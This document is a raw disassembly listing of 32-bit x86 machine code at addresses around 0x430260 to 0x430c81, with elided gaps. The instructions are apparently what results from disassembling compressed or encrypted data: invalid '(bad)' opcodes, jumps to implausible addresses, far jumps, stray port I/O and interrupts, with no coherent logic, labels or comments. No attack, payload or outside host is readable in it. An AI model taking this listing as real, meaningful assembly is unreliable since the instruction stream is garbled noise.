  430260:	or     BYTE PTR [eax],al
  430262:	xchg   esi,eax
  430263:	sub    eax,0x25880c28
  430268:	sub    BYTE PTR [eax],dl
  43026a:	fld    QWORD PTR [ebp-0x8]
  43026d:	and    ebx,DWORD PTR [ecx]
  43026f:	repnz (bad) 
  430271:	and    edx,DWORD PTR [ecx]
  430273:	push   ecx
  430274:	jl     0x430272
  430276:	sbb    ch,BYTE PTR [esi-0x34678c1]
  43027c:	jge    0x141002d3
	...
  43029e:	add    BYTE PTR [eax],al
  4302a0:	pop    ebp
  4302a1:	ja     0x4302b8
  4302a3:	sub    BYTE PTR [ecx],cl
  4302a5:	mov    ebp,DWORD PTR ds:0x2b680128
  4302ab:	and    dh,0x76
  4302ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4302af:	(bad)  [ebx+0x5bd51863]
  4302b5:	cmc    
  4302b6:	loopne 0x4302bb
  4302b8:	pop    eax
  4302b9:	push   DWORD PTR [eax]
  4302bb:	xlat   BYTE PTR ds:[ebx]
  4302bc:	retf   0x68fd
  4302bf:	imul   esi,DWORD PTR [edx],0xffffff8b
  4302c2:	lods   al,BYTE PTR ds:[esi]
  4302c3:	adc    ecx,DWORD PTR [edx+0x68]
  4302c6:	xchg   ecx,eax
  4302c7:	jle    0x43027f
  4302c9:	jbe    0x430329
  4302cb:	pop    esp
  4302cc:	nop
  4302cd:	pop    edx
  4302ce:	rol    BYTE PTR [esi],0x65
  4302d1:	into   
  4302d2:	call   0x95ad8fdd
  4302d7:	sub    BYTE PTR [eax],0x78
  4302da:	jmp    0xe9b9d324
  4302df:	aad    0x8d
  4302e1:	inc    edx
  4302e2:	jmp    0x51430feb
  4302e7:	jg     0x43035f
  4302e9:	jbe    0x430275
  4302eb:	cmp    al,BYTE PTR [ebp-0xd]
  4302ee:	jmp    0xc7e:0xa43d458a
  4302f5:	test   ebp,ebp
  4302f7:	sbb    bh,BYTE PTR [ebp+0x357b7484]
  4302fd:	push   esi
  4302fe:	sbb    al,0x4
  430300:	or     eax,0xf7a97c
	...
  430321:	add    bl,ch
  430323:	jbe    0x430381
  430325:	sbb    BYTE PTR [edx-0x5f810734],cl
  43032b:	add    ebp,DWORD PTR [esi-0x38]
  43032e:	sbb    cl,BYTE PTR [edx+0x739e6bae]
  430334:	add    BYTE PTR [esi+0x68f07e93],dh
  43033a:	mov    dh,ch
  43033c:	(bad)  
  43033d:	in     eax,dx
  43033e:	mov    gs,ebx
  430340:	sbb    al,0x69
  430342:	or     eax,0xb11d0079
  430347:	jns    0x4303be
  430349:	xchg   ecx,eax
  43034a:	jbe    0x43036f
  43034c:	xor    ch,cl
  43034e:	push   cs
  43034f:	jge    0x430313
  430351:	pop    ds
  430352:	mov    dh,0x48
  430354:	mov    esi,0x76ba0ed9
  430359:	jmp    0x512a8371
  43035e:	xchg   ebp,eax
  43035f:	jb     0x4303d6
  430361:	inc    esp
  430362:	xchg   DWORD PTR [ebx+0x6ddd6207],edi
  430368:	mov    ecx,esp
  43036a:	fistp  QWORD PTR [edi]
  43036c:	out    0x4a,eax
  43036e:	lds    edi,FWORD PTR [esi-0x14]
  430371:	cwde   
  430372:	shl    esi,0x7c
  430375:	loope  0x430385
  430377:	jmp    0x43037b
  430379:	jno    0x4303de
  43037b:	jne    0x43037f
  43037d:	imul   esi,edi,0x1eac86f1
  430383:	(bad)
	...
  4303a2:	add    BYTE PTR [eax],al
  4303a4:	lock js 0x4303a2
  4303a7:	(bad)  
  4303a8:	(bad)  
  4303a9:	jp     0x430382
  4303ab:	or     BYTE PTR [ebx],0xb8
  4303ae:	push   ebx
  4303af:	jmp    0x972a83c7
  4303b4:	(bad)  
  4303b5:	fcomi  st,st(7)
  4303b7:	jmp    0xea3dbe8c
  4303bc:	pop    eax
  4303bd:	cmp    BYTE PTR [edi+0xfe9],0x6c
  4303c4:	aam    0xf9
  4303c6:	pop    es
  4303c7:	push   0xfb78a4
  4303cc:	dec    ebx
  4303cd:	jae    0x430446
  4303cf:	or     DWORD PTR [edi-0x2400090d],ecx
  4303d5:	mov    ebp,0x4ff5ff44
  4303da:	mov    WORD PTR [ebp-0x54],?
  4303dd:	jecxz  0x43041a
  4303df:	xor    eax,0xc08400e4
  4303e4:	adc    BYTE PTR [edi],ch
  4303e6:	div    DWORD PTR [ebp-0x20]
  4303e9:	xchg   DWORD PTR [ebp+0x10],edx
  4303ec:	mov    ebp,DWORD PTR [edi+eax*1-0x75]
  4303f0:	xor    esp,esi
  4303f2:	or     bl,0x8c
  4303f5:	push   eax
  4303f6:	repnz (bad) 
  4303f8:	cmp    eax,DWORD PTR [edi+0x7a2a81f0]
  4303fe:	sti    
  4303ff:	push   es
  430400:	and    al,0x6d
  430402:	sbb    al,0x80
  430404:	fpatan 
  430406:	push   DWORD PTR [ebx+0x0]
	...
  430425:	add    BYTE PTR [ecx+0x3cf874f2],al
  43042b:	mov    dh,BYTE PTR ds:0xbe87a400
  430431:	pop    esi
  430432:	jg     0x4303fd
  430434:	mov    ecx,0x72b27410
  430439:	add    BYTE PTR [ebx-0x80],dh
  43043c:	jecxz  0x430427
  43043e:	icebp  
  43043f:	in     eax,dx
  430440:	je     0x430427
  430442:	out    dx,eax
  430443:	cmp    al,0xf3
  430445:	mov    ecx,DWORD PTR [ecx-0x58fe76f8]
  43044b:	shl    dl,0xe3
  43044e:	jmp    0x7453239a
  430453:	repz jae 0x43047a
  430456:	fs repz jae 0x43047e
  43045a:	inc    esp
  43045b:	repz jae 0x430482
  43045e:	xor    al,0xe8
  430460:	dec    DWORD PTR ds:0xc0bf7c4e
  430467:	loope  0x4304d3
  430469:	jg     0x43049c
  43046b:	push   0xffffff88
  43046d:	push   ecx
  43046e:	add    eax,0xbb19891a
  430473:	adc    eax,0xeb1af889
  430478:	ret    
  430479:	aaa    
  43047a:	xchg   esi,eax
  43047b:	adc    bh,BYTE PTR [eax]
  43047d:	daa    
  43047e:	fisub  WORD PTR [edx-0x54]
  430481:	rol    BYTE PTR [edx],1
  430483:	mov    edx,0xe0df273f
  430488:	icebp  
  430489:	sti    
	...
  4304a6:	add    BYTE PTR [eax],al
  4304a8:	xchg   esi,eax
  4304a9:	js     0x4304ae
  4304ab:	mov    DWORD PTR [eax-0x13],esp
  4304ae:	or     ebp,DWORD PTR [ebx-0xfff4aa6]
  4304b4:	push   cs
  4304b5:	push   0x17
  4304b7:	add    BYTE PTR [eax+0x71],0xff
  4304bb:	mov    BYTE PTR [eax-0x1f],ah
  4304be:	repnz pop es
  4304c0:	xchg   BYTE PTR [edx+0x6150891f],ah
  4304c6:	push   0x7b49402
  4304cb:	xchg   DWORD PTR [edx],esp
  4304cd:	or     DWORD PTR [ecx-0x2501fea7],ecx
  4304d3:	repz sbb dh,dl
  4304d6:	(bad)  [ebx]
  4304d8:	push   cs
  4304d9:	cmp    al,0x7
  4304db:	sti    
  4304dc:	and    BYTE PTR ds:0xdf0d400f,bl
  4304e2:	ret    
  4304e3:	aaa    
  4304e4:	sub    DWORD PTR [eax-0xe],ebp
  4304e7:	push   ds
  4304e8:	xchg   esi,eax
  4304e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4304ea:	pop    es
  4304eb:	out    0xf5,eax
  4304ed:	in     eax,dx
  4304ee:	leave  
  4304ef:	test   DWORD PTR [eax+0x13e707ad],0x138806df
  4304f9:	add    BYTE PTR [ebx],ch
  4304fb:	les    eax,FWORD PTR [ebx]
  4304fd:	cmp    edx,DWORD PTR [edi+0x72]
  430500:	xor    ch,ah
  430502:	aam    0x7
  430504:	shl    BYTE PTR [ebx+0xe],1
  430507:	inc    edi
  430508:	mov    bl,0x5b
  43050a:	into   
  43050b:	rol    BYTE PTR [eax],1
	...
  430529:	add    dh,dl
  43052b:	std    
  43052c:	xor    ebp,DWORD PTR [edx+ecx*4]
  43052f:	mov    ebp,0x87286ee0
  430534:	sbb    al,0x7c
  430536:	add    bh,BYTE PTR [ebx]
  430538:	mov    cs,WORD PTR [eax]
  43053a:	outs   dx,DWORD PTR ds:[esi]
  43053b:	xchg   ecx,edi
  43053d:	loope  0x4304c4
  43053f:	or     DWORD PTR [esi+0x42],esp
  430542:	jmp    0x4305c1
  430544:	test   eax,0xf7411a06
  430549:	jae    0x430525
  43054b:	jmp    0x4305c9
  43054d:	pop    es
  43054e:	dec    eax
  43054f:	je     0x4304ff
  430551:	inc    esi
  430552:	cmp    edx,DWORD PTR [ebx+0x7e]
  430555:	sub    al,0x1
  430557:	cld    
  430558:	fistp  DWORD PTR [edi]
  43055a:	xchg   edx,eax
  43055b:	mov    esp,0x871a6ef0
  430560:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430561:	jnp    0x43050d
  430563:	cmp    bh,BYTE PTR [esi]
  430565:	push   cs
  430566:	mov    cl,BYTE PTR [edi]
  430568:	jo     0x43057c
  43056a:	sbb    bh,BYTE PTR [edx]
  43056c:	in     eax,0x86
  43056e:	int    0xfb
  430570:	in     eax,dx
  430571:	inc    esp
  430572:	sti    
  430573:	ins    DWORD PTR es:[edi],dx
  430574:	out    0xf0,al
  430576:	xchg   dh,bh
  430578:	stos   DWORD PTR es:[edi],eax
  430579:	ja     0x4305bd
  43057b:	aas    
  43057c:	xchg   edi,eax
  43057d:	fs (bad) 
  43057f:	shr    DWORD PTR [ebp-0x170454b4],1
  430585:	ror    BYTE PTR [ebx-0x5297979d],1
  43058b:	(bad)  
  43058c:	call   0x430594
	...
  4305a9:	add    BYTE PTR [eax],al
  4305ab:	add    dl,al
  4305ad:	leave  
  4305ae:	call   FWORD PTR [ebp+0x620becc7]
  4305b4:	shl    DWORD PTR [edi+0x2b],0x60
  4305b8:	adc    DWORD PTR [eax],eax
  4305ba:	or     edx,DWORD PTR [esi-0x22ba7732]
  4305c0:	jbe    0x4305c2
  4305c2:	je     0x4305aa
  4305c4:	pop    esi
  4305c5:	add    cl,ch
  4305c7:	or     eax,0xfa000012
  4305cc:	mov    bl,0xdd
  4305ce:	ss stos BYTE PTR es:[edi],al
  4305d0:	std    
  4305d1:	sti    
  4305d2:	ret    0x7d24
  4305d5:	jb     0x4305d2
  4305d7:	jmp    0x95887eea
  4305dc:	ror    DWORD PTR ss:[edi],cl
  4305df:	sbb    eax,0x14fea816
  4305e4:	adc    bl,BYTE PTR [ebx]
  4305e6:	std    
  4305e7:	xchg   BYTE PTR [esi],cl
  4305e9:	add    BYTE PTR [edi-0x4f],bh
  4305ec:	push   es
  4305ed:	xchg   DWORD PTR [ebp+0x7d],eax
  4305f0:	xchg   ebp,eax
  4305f1:	jnp    0x430653
  4305f3:	outs   dx,BYTE PTR ds:[esi]
  4305f4:	inc    edi
  4305f5:	jne    0x430647
  4305f7:	mov    bp,0x8905
  4305fb:	mov    esp,0x595d872a
  430600:	cdq    
  430601:	shl    edi,cl
  430603:	pusha  
  430604:	lds    ebx,FWORD PTR [ebp-0x3d]
  430607:	ins    BYTE PTR es:[edi],dx
  430608:	scas   al,BYTE PTR es:[edi]
  430609:	jbe    0x430606
  43060b:	ds (bad) 
  43060e:	(bad)  
  43060f:	call   0x430614
	...
  43062c:	add    BYTE PTR [eax],al
  43062e:	pop    es
  43062f:	or     esi,esp
  430631:	fimul  DWORD PTR [esi+0x71]
  430634:	test   BYTE PTR [ecx],ch
  430636:	jge    0x430636
  430638:	sub    eax,0xfe45e129
  43063d:	call   0xed787f50
  430642:	adc    al,al
  430644:	(bad)  
  430645:	(bad)  
  430646:	jnp    0x4305d0
  430648:	test   DWORD PTR [ebx+edx*2-0x9],esp
  43064c:	not    BYTE PTR [eax-0x4f]
  43064f:	aas    
  430650:	mov    edi,0x84d03350
  430655:	rol    BYTE PTR [ebx-0x7e],0xba
  430659:	mov    cl,bh
  43065b:	icebp  
  43065c:	xor    ebx,edx
  43065e:	enter  0x831a,0x4f
  430662:	sub    BYTE PTR [ebp+eax*4-0x908ac98],al
  430669:	cmp    esp,DWORD PTR [ebp+0x69]
  43066c:	add    al,0x2b
  43066e:	mov    ch,0x84
  430670:	inc    ebp
  430671:	lock outs dx,DWORD PTR ds:[esi]
  430673:	pop    es
  430674:	add    DWORD PTR [ebp-0x908f8],0xffffffef
  43067b:	mov    ebp,0xbdcf057c
  430680:	mov    BYTE PTR [ebp+0x60],al
  430683:	add    DWORD PTR [ebp-0xc],0x67
  430687:	fdiv   st(1),st
  430689:	mov    BYTE PTR [ecx],ch
  43068b:	mov    eax,0xb14b4c74
  430690:	jg     0x430692
	...
  4306ae:	add    BYTE PTR [eax],al
  4306b0:	mov    ah,0xfc
  4306b2:	pop    ds
  4306b3:	je     0x43065e
  4306b5:	test   BYTE PTR [ebp+0x13],bl
  4306b8:	pop    edi
  4306b9:	cmp    eax,0x70398d4e
  4306be:	idiv   bh
  4306c0:	push   ebx
  4306c1:	dec    esp
  4306c2:	mov    WORD PTR [ebp-0x8],es
  4306c5:	dec    ebx
  4306c6:	not    dh
  4306c8:	sub    DWORD PTR [esi+eax*1+0x380bb995],edi
  4306cf:	pop    ebp
  4306d0:	addr16 pusha 
  4306d2:	and    ecx,DWORD PTR [ebx-0x7a7d8f3d]
  4306d8:	lods   al,BYTE PTR ds:[esi]
  4306d9:	div    esi
  4306db:	dec    DWORD PTR ds:0x87d3e4e
  4306e1:	ds ds mov eax,edx
  4306e5:	add    cl,BYTE PTR [ebp-0x102479f5]
  4306eb:	cli    
  4306ec:	dec    edx
  4306ed:	imul   edi,DWORD PTR [ecx+eax*8],0xc12c5cc0
  4306f4:	test   BYTE PTR [ebx],ah
  4306f6:	ins    BYTE PTR es:[edi],dx
  4306f7:	out    0xe,eax
  4306f9:	out    dx,eax
  4306fa:	leave  
  4306fb:	push   cs
  4306fc:	in     eax,0x2b
  4306fe:	jp     0x430775
  430700:	adc    al,0xf
  430702:	ror    DWORD PTR [esi],cl
  430704:	or     ah,bl
  430706:	jbe    0x430702
  430708:	adc    dh,BYTE PTR [ecx+0x6120fad4]
  43070e:	or     al,BYTE PTR [eax+0xd]
  430711:	loop   0x430789
  430713:	aaa    
	...
  430730:	add    BYTE PTR [eax],al
  430732:	div    BYTE PTR [esi+0x7b]
  430735:	cmp    eax,0x53788ef2
  43073a:	jmp    0xd059:0x4d10436c
  430741:	dec    esi
  430742:	xchg   cl,ch
  430744:	ja     0x43075b
  430746:	std    
  430747:	push   ebx
  430748:	mov    edi,0x7ea07ff
  43074d:	test   cl,ch
  43074f:	fnsave [edi-0x5]
  430752:	xchg   BYTE PTR [edi+eax*1-0x5],ah
  430756:	cmp    ch,BYTE PTR [ebp-0x2f]
  430759:	cli    
  43075a:	add    BYTE PTR [ecx-0x1ff2bff1],cl
  430760:	mov    ecx,0xea19d6bf
  430765:	or     edi,DWORD PTR [ebx]
  430767:	cs or  al,al
  43076a:	sbb    eax,0x9e8ff99
  43076f:	push   ds
  430770:	js     0x43076d
  430772:	push   ebx
  430773:	add    BYTE PTR [esp+edi*2-0x292019f4],ch
  43077a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43077b:	jmp    FWORD PTR [edx+esi*8+0xd]
  43077f:	add    cl,ch
  430781:	mov    eax,ss
  430783:	sti    
  430784:	outs   dx,DWORD PTR ds:[esi]
  430785:	mov    esi,0x57a47b72
  43078a:	repnz les ebx,FWORD PTR [edx+ecx*4]
  43078e:	mov    eax,0x6abe60a3
  430793:	jnp    0x4307c1
  430795:	add    BYTE PTR fs:[eax],al
	...
  4307b4:	jmp    0xe8a7:0xd03fc0c4
  4307bb:	add    ecx,DWORD PTR ds:0x5ec16000
  4307c1:	jge    0x4307ef
  4307c3:	cwde   
  4307c4:	mov    ebp,0xe917f46e
  4307c9:	ret    0x8ce8
  4307cc:	pusha  
  4307cd:	cwde   
  4307ce:	pusha  
  4307cf:	fldenv [esi+0x1df7fc6e]
  4307d5:	shr    al,0x83
  4307d8:	push   0x208ae86a
  4307dd:	pop    eax
  4307de:	cmc    
  4307df:	ret    
  4307e0:	(bad)  
  4307e2:	add    ecx,DWORD PTR [ecx-0x76e6bbb8]
  4307e8:	push   eax
  4307e9:	push   esp
  4307ea:	sbb    DWORD PTR [edi+0x18],esi
  4307ed:	adc    ch,dl
  4307ef:	ret    
  4307f0:	mov    edx,0x2bf12983
  4307f5:	(bad)  
  4307f6:	pop    ecx
  4307f7:	adc    DWORD PTR [ebp-0x6bfc56f1],edi
  4307fd:	les    edx,FWORD PTR [ebp+edi*1+0x38]
  430801:	pop    esp
  430802:	mov    esp,0x38ccd400
  430807:	lock adc al,0xd3
  43080a:	push   DWORD PTR ds:0xb4fb5e7c
  430810:	repnz sar edx,1
  430813:	cld    
  430814:	mov    ds:0xe9400f,al
	...
  430835:	add    BYTE PTR [edi-0x6a45f83c],dl
  43083b:	mov    esp,0x6cf701c3
  430840:	sti    
  430841:	push   es
  430842:	ds in  al,0x0
  430845:	xchg   ecx,eax
  430846:	(bad)  
  430847:	(bad)  
  430848:	(bad)  
  430849:	call   0x614efd09
  43084e:	push   esp
  43084f:	mov    bh,bl
  430851:	mov    esi,0x549bccf6
  430856:	add    dh,ah
  430858:	std    
  430859:	xor    DWORD PTR ds:[ecx],edx
  43085c:	(bad)  
  43085d:	call   0xf5b87370
  430862:	fwait
  430863:	adc    al,0x8
  430865:	aad    0xce
  430867:	ins    DWORD PTR es:[edi],dx
  430868:	xchg   BYTE PTR [ecx+edx*1],ch
  43086b:	out    0x0,al
  43086d:	pop    esp
  43086e:	lds    eax,FWORD PTR [ecx-0x18]
  430871:	mov    ?,WORD PTR [edx+0x69]
  430874:	sti    
  430875:	sahf   
  430876:	fnsave [ecx+0x52]
  430879:	xchg   esi,eax
  43087a:	std    
  43087b:	push   ebx
  43087c:	adc    BYTE PTR [ecx],ch
  43087e:	adc    DWORD PTR [eax-0x6f62583],eax
  430884:	test   BYTE PTR [esi+0xe],dl
  430887:	add    BYTE PTR [eax],al
  430889:	mov    al,0xe5
  43088b:	gs jne 0x43086f
  43088e:	xchg   bl,cl
  430890:	push   cs
  430891:	and    ah,dl
  430893:	popa   
  430894:	je     0x43087b
  430896:	call   0x12b175d
	...
  4308b7:	add    al,dl
  4308b9:	push   0x15
  4308bb:	cmp    esi,edi
  4308bd:	mov    edi,0x401dffff
  4308c2:	out    dx,eax
  4308c3:	cmp    BYTE PTR [ecx-0x58f18bee],ch
  4308c9:	div    BYTE PTR [esp+eiz*8+0x2b]
  4308cd:	jo     0x4308b2
  4308cf:	push   esi
  4308d0:	sub    edx,DWORD PTR [eax]
  4308d2:	mov    ah,0x10
  4308d4:	mov    ah,0x1
  4308d6:	add    DWORD PTR [ebp+0x6c],0x52
  4308da:	mov    WORD PTR [ebp+0x20],cs
  4308dd:	fstp   DWORD PTR [eax+0x4af60bfc]
  4308e3:	push   esi
  4308e4:	sahf   
  4308e5:	std    
  4308e6:	div    BYTE PTR [ebp+0x28]
  4308e9:	test   dh,0xff
  4308ec:	rcr    esp,0xee
  4308ef:	fmul   DWORD PTR [edi]
  4308f1:	les    edi,FWORD PTR [edi]
  4308f3:	push   esi
  4308f4:	popf   
  4308f5:	lods   al,BYTE PTR ds:[esi]
  4308f6:	mov    bl,0xff
  4308f8:	and    DWORD PTR [ebp+0x2924400f],edi
  4308fe:	pop    ebp
  4308ff:	adc    edx,eax
  430901:	add    eax,0xe041ff4b
  430906:	div    BYTE PTR [ebp-0x34]
  430909:	cmp    eax,0x148015f6
  43090e:	inc    eax
  43090f:	add    BYTE PTR [edi],dh
  430911:	dec    edi
  430912:	gs jnp 0x19cb1075
  430919:	mov    bh,dh
  43091b:	xlat   BYTE PTR ds:[ebx]
	...
  430938:	add    BYTE PTR [eax],al
  43093a:	mov    esp,0xb5759755
  43093f:	push   esi
  430940:	call   DWORD PTR [ebp+0x1c]
  430943:	sti    
  430944:	cli    
  430945:	push   DWORD PTR [ebx+esi*8-0x2d4f38c]
  43094c:	pop    es
  43094d:	adc    al,0x64
  43094f:	add    BYTE PTR [ebx+0x569c45],al
  430955:	lea    ecx,ds:0xd9e84ba4
  43095b:	mov    edx,0xc63efb74
  430960:	sub    bl,BYTE PTR [ecx+ebp*2]
  430963:	cdq    
  430964:	(bad)  
  430965:	cli    
  430966:	sbb    BYTE PTR [ebx-0x3df2bff2],dh
  43096c:	mov    ecx,0xac8f1
  430971:	je     0x430939
  430973:	pop    edi
  430974:	shr    bl,cl
  430976:	fcomp  DWORD PTR [ebx+0x36]
  430979:	pop    ebp
  43097a:	pop    ebp
  43097b:	xchg   edx,eax
  43097c:	add    eax,0x6eeb524f
  430981:	sti    
  430982:	sar    dl,0xc9
  430985:	cli    
  430986:	sbb    BYTE PTR [ebx],ch
  430988:	adc    al,0x40
  43098a:	or     eax,0x494d828a
  43098f:	icebp  
  430990:	cmp    ebp,eax
  430992:	adc    DWORD PTR [ebx+0x74],ecx
  430995:	sti    
  430996:	mov    bh,0x64
  430998:	int    0x67
  43099a:	add    bl,BYTE PTR [edx-0x1]
  43099d:	inc    DWORD PTR [eax]
	...
  4309bb:	add    BYTE PTR [edx],dl
  4309bd:	sub    ecx,DWORD PTR [eax]
  4309bf:	sti    
  4309c0:	and    BYTE PTR [ecx+0xb],dh
  4309c3:	inc    eax
  4309c4:	or     eax,0x488cfebf
  4309c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4309ca:	mov    bl,al
  4309cc:	in     eax,0x7a
  4309ce:	js     0x4309cb
  4309d0:	jmp    0xa92:0x3bbfea8a
  4309d7:	mov    al,0xfd
  4309d9:	sbb    BYTE PTR [edx+edx*2],al
  4309dc:	ror    BYTE PTR [edi+edi*1+0x10],cl
  4309e0:	dec    ebp
  4309e1:	pop    ecx
  4309e2:	mov    DWORD PTR [ebp-0x3a],eax
  4309e5:	adc    dl,dl
  4309e7:	push   esi
  4309e8:	les    edx,FWORD PTR [edi+0xbb0003]
  4309ee:	lods   al,BYTE PTR ds:[esi]
  4309ef:	outs   dx,DWORD PTR ds:[esi]
  4309f0:	adc    eax,0x403a39f4
  4309f5:	pop    esp
  4309f6:	fdiv   st(6),st
  4309f8:	aad    0xcc
  4309fa:	pop    eax
  4309fb:	out    dx,eax
  4309fc:	add    al,0xcf
  4309fe:	inc    ecx
  4309ff:	out    dx,al
  430a00:	jp     0x430a6d
  430a02:	mov    ah,0x67
  430a04:	fild   QWORD PTR [edx-0x24]
  430a07:	scas   eax,DWORD PTR es:[edi]
  430a08:	sbb    eax,0x81d0e8c0
  430a0d:	mov    ebp,0x584e882c
  430a12:	inc    esi
  430a13:	js     0x430a7b
  430a15:	imul   esi,DWORD PTR [esi-0x230aa833],0x74
  430a1c:	clc    
  430a1d:	sti    
  430a1e:	fadd   st(3),st
	...
  430a3c:	add    BYTE PTR [eax],al
  430a3e:	dec    edx
  430a3f:	test   BYTE PTR [ecx],ch
  430a41:	out    dx,al
  430a42:	ins    DWORD PTR es:[edi],dx
  430a43:	js     0x4309d9
  430a45:	js     0x430a79
  430a47:	cwde   
  430a48:	repz std 
  430a4a:	adc    cl,BYTE PTR [edx+0x26]
  430a4d:	add    al,0x11
  430a4f:	iret   
  430a50:	ins    DWORD PTR es:[edi],dx
  430a51:	shr    dh,1
  430a53:	idiv   DWORD PTR [edx]
  430a55:	fist   DWORD PTR [ebx-0x66e7fb14]
  430a5b:	mov    ecx,0xffa36ed0
  430a60:	call   0x2c36d7ec
  430a65:	mov    esi,esi
  430a67:	repz daa 
  430a69:	jae    0x430aa3
  430a6b:	or     al,0xc5
  430a6d:	(bad)  
  430a6e:	jmp    0xe8bf:0xfdebf469
  430a75:	jle    0x430a54
  430a77:	test   BYTE PTR [ebx+0x232727f8],dl
  430a7d:	or     BYTE PTR [eax+0x16],al
  430a80:	pinsrw mm3,WORD PTR [edi+0x58],0x0
  430a85:	push   ecx
  430a86:	add    BYTE PTR [eax],al
  430a88:	add    BYTE PTR [edx-0x39],ah
  430a8b:	add    cl,BYTE PTR [ecx+0x1bbe2bee]
  430a91:	jo     0x430a69
  430a93:	(bad)  
  430a94:	gs stc 
  430a96:	lea    edi,[ebp+0x3e8bb90b]
  430a9c:	or     BYTE PTR [esi-0x16cfbb1a],bl
	...
  430abe:	add    BYTE PTR [eax],al
  430ac0:	push   cs
  430ac1:	add    DWORD PTR [edx-0x1f],0xffffffc4
  430ac5:	std    
  430ac6:	add    BYTE PTR [edx+0x71],al
  430ac9:	int    0x4e
  430acb:	es add al,0x24
  430ace:	adc    al,0xa9
  430ad0:	push   cs
  430ad1:	(bad)  
  430ad2:	pop    ecx
  430ad3:	mov    dl,0xd0
  430ad5:	idiv   edi
  430ad7:	push   ss
  430ad8:	add    al,0x20
  430ada:	fisubr DWORD PTR [edx+0x7252040e]
  430ae0:	inc    ebp
  430ae1:	push   ds
  430ae2:	or     BYTE PTR [ebp-0xd],bh
  430ae5:	push   edi
  430ae6:	nop
  430ae7:	push   ebx
  430ae8:	or     DWORD PTR [eax],eax
  430aea:	test   BYTE PTR [ecx+0x14fb1422],ch
  430af0:	std    
  430af1:	dec    ebx
  430af2:	aas    
  430af3:	jmp    0xf8bb1f97
  430af8:	dec    esi
  430af9:	push   0xffffff84
  430afb:	test   eax,0x39370402
  430b00:	adc    eax,0x4efa04f3
  430b05:	shl    dh,0xe2
  430b08:	jg     0x430afe
  430b0a:	and    esi,ebp
  430b0c:	les    esp,FWORD PTR [esi+0x15]
  430b0f:	loope  0x430b0b
  430b11:	mov    edi,0xf85336ff
  430b16:	push   DWORD PTR [ebx]
  430b18:	push   edx
  430b19:	pop    esp
  430b1a:	repnz add BYTE PTR [ecx-0x4bbc29e3],bh
  430b21:	add    DWORD PTR [esi+0x57],ecx
	...
  430b40:	add    BYTE PTR [eax],al
  430b42:	das    
  430b43:	jo     0x430b48
  430b45:	je     0x430bc2
  430b47:	lds    ecx,FWORD PTR [edx+ebx*4-0x4c]
  430b4b:	std    
  430b4c:	add    eax,0xffffffb8
  430b4f:	pop    ds
  430b50:	div    DWORD PTR ds:0x3ab9a0
  430b56:	inc    ebx
  430b57:	or     BYTE PTR [eax+0x11],bh
  430b5a:	mov    ah,0xfd
  430b5c:	xor    al,0xe9
  430b5f:	out    0x73,al
  430b61:	sbb    al,0x7f
  430b63:	outs   dx,DWORD PTR ds:[esi]
  430b64:	push   DWORD PTR [ebx+ebx*2-0x19]
  430b68:	inc    esp
  430b69:	adc    BYTE PTR [ecx+esi*2],dh
  430b6c:	or     bh,bh
  430b6e:	jns    0x430bd9
  430b70:	not    BYTE PTR ds:0x400d20
  430b76:	out    dx,eax
  430b77:	ss add eax,esi
  430b7a:	cmp    al,BYTE PTR [ebx+eiz*8]
  430b7d:	or     eax,0xff0b7143
  430b82:	mov    ecx,0x59ff4e68
  430b87:	cmc    
  430b88:	adc    eax,DWORD PTR [eax+0x34]
  430b8b:	push   eax
  430b8c:	pop    ecx
  430b8d:	pop    ebp
  430b8e:	jbe    0x430b90
  430b90:	add    dh,dh
  430b92:	sub    DWORD PTR ds:0x12443d6,ebx
  430b98:	dec    esi
  430b99:	mov    ecx,DWORD PTR [eax+0x18]
  430b9c:	or     BYTE PTR [edx+ecx*1-0x34],dh
  430ba0:	hlt    
  430ba1:	cdq    
  430ba2:	in     al,0xfc
  430ba4:	add    eax,0x0
	...
  430bc3:	add    BYTE PTR [eax],bh
  430bc5:	stc    
  430bc6:	div    BYTE PTR ds:0x3ad010
  430bcc:	adc    DWORD PTR [eax],0x78
  430bcf:	adc    DWORD PTR ds:0xcd850417,ecx
  430bd5:	adc    bh,bl
  430bd7:	ss cmp eax,0xcb07f25b
  430bdd:	push   esi
  430bde:	inc    BYTE PTR [esi+0x35c5f4d]
  430be4:	pop    ebx
  430be5:	ficom  DWORD PTR [edx]
  430be7:	or     BYTE PTR [eax],al
  430be9:	xchg   edi,eax
  430bea:	call   FWORD PTR [ecx-0x31]
  430bed:	(bad)  
  430bee:	push   ecx
  430bf0:	adc    bh,dh
  430bf2:	dec    ebp
  430bf3:	aas    
  430bf4:	or     eax,0x186d963
  430bf9:	sti    
  430bfa:	sti    
  430bfb:	jae    0x430c28
  430bfd:	iret   
  430bfe:	mov    ch,0x99
  430c00:	or     eax,0xf9c08357
  430c05:	cmp    esi,DWORD PTR [eax+0x35]
  430c08:	or     ebx,eax
  430c0a:	(bad)  
  430c0b:	jmp    DWORD PTR [ebx+0x73]
  430c0e:	out    0x10,eax
  430c10:	int    0x56
  430c12:	add    al,0xd9
  430c15:	dec    ebx
  430c16:	sub    al,0x70
  430c18:	adc    esp,ebp
  430c1a:	test   cl,0xd
  430c1d:	pop    eax
  430c1e:	jl     0x430c60
  430c20:	add    eax,0x325208fe
  430c25:	push   ebx
  430c26:	das    
  430c27:	adc    al,0x0
	...
  430c45:	add    ch,cl
  430c47:	push   esi
  430c48:	sar    DWORD PTR [ebp+0x5795709],1
  430c4e:	in     eax,dx
  430c4f:	mov    al,0xc4
  430c51:	dec    DWORD PTR [esi]
  430c53:	xor    DWORD PTR [ebp+0x74],edi
  430c56:	xor    DWORD PTR [ebp-0xd],ebp
  430c59:	push   ds
  430c5a:	cmc    
  430c5b:	xchg   DWORD PTR cs:[eax],eax
  430c5e:	or     eax,0x17743ed5
  430c63:	xchg   esi,eax
  430c64:	xor    bl,BYTE PTR [ecx+ecx*8]
  430c67:	add    BYTE PTR [esi],ah
  430c69:	add    al,0xe6
  430c6b:	or     eax,0x4d1321
  430c70:	ins    BYTE PTR es:[edi],dx
  430c71:	inc    ebx
  430c72:	pop    ecx
  430c73:	cli    
  430c74:	int    0xf3
  430c76:	adc    ch,ch
  430c78:	jmp    0x430cae
  430c7a:	int    0xc0
  430c7c:	(bad)  
  430c7d:	cld    
  430c7e:	pop    esp
  430c7f:	addr16 std 
  430c81:	daa    
